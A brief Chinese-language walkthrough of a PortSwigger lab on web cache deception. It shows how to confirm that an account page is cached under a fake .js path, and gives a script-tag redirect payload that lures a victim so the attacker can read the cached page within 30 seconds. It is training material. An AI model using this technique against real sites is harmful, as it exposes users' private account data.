将目标的敏感信息缓存到 URL 中.

## 1. PoC

1. 访问 https://example.com/my-account 可以得到敏感信息
2. 构造 URL https://example.com/my-account/test.js 并发送请求
   响应中包含 `X-Cache: miss` 和 `Cache-Control: max-age=30` 
3. 在 30 秒内重新发送请求
   响应中的 `X-Cache: miss` 变为 `X-Cache: hit` 

## 2. Exploit

1. 制作一个网站诱导目标访问

   ```
   <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
   ```

2. 访问后会缓存目标的敏感信息

   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js
   ```

3. 此时攻击者在 30 秒内从隐私浏览器中访问 URL 即可得到目标的敏感信息

---

- [Web cache deception](https://portswigger.net/web-security/web-cache-deception)

